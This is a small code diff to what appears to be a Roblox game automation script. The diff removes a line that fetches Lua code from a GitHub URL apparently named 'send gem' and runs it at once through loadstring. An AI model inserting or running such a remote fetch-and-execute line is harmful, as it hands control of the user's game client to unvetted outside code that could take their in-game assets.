@@ -1,4 +1,3 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/CHICHazHUB/Semaguteb/main/send%20gem"))()
 local Settings = {
 	AutoOpenGifts = true,
 	AutoOpenPresents = true,
